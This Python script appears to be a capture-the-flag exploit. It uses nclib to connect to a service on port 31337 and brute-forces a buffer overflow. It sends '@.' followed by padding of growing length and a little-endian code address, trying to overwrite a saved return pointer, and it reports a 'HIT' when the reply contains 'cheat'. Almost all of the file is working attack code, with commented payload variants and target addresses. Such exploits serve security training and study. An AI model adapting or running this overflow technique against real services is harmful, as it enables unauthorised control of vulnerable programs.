from nclib.netcat import Netcat
import binascii
import time
import secrets
from random import randrange

#while False:
add = 0
while add < 10:
    add += 1
    try:
        nc = Netcat(("127.0.0.1", 31337), verbose=True)
        nc.recv()
        count = 200 // add
        #send = secrets.token_bytes(randrange(1, 8))
        #send = secrets.token_bytes(1) + b'\x8e\x04\x80'
        send = b'\x28\x8e\x04\x80'
        if "\x00" in send.decode(errors="ignore"):
            continue
        while True:
            #nc = Netcat(("pwning.io", 31337), verbose=True)
            #nc.recv()
            #nc.sendline("2".encode())
            #nc.recv()
            #nc.sendline(("@." + ("a" * 112) + ("\x39\x05")).encode())
            #nc.sendline(("@." + ("a" * 114) + ("\x39\x05")).encode())
            #payload = ("@." + ("a" * 279) + ("\x39\x05\0\0")).encode()
            #payload = ("@." + ("-" * count) + ("------\x28\x8e\x04\x80")).encode()
            payload = ("@.".encode() + ("-" * count).encode() + send)

            nc.send(payload)
            #count+=1
            count += add
            print("Round " + str(count))
            result = nc.recv(n=50000, timeout=0.1).decode(errors="ignore")
            result += nc.recv(n=50000, timeout=0.1).decode(errors="ignore")
            if "cheat" in result:
                print("++++++++++++++++++++++++++++++++++++++ HIT +++++++++++++++++++++++++++++++++++++")
                print(result)
                print(payload)
                print("++++++++++++++++++++++++++++++++++++++ HIT +++++++++++++++++++++++++++++++++++++")
                break
    except Exception as e:
        print(e)
        print("Crashed it! Trying again...")

# 0x8048e28
# 0x8048e87
# 28 8e 04 80
# \x28\x8e\x04\x80

# Saved return pointer
# 0x8048916
# 10 89 04 08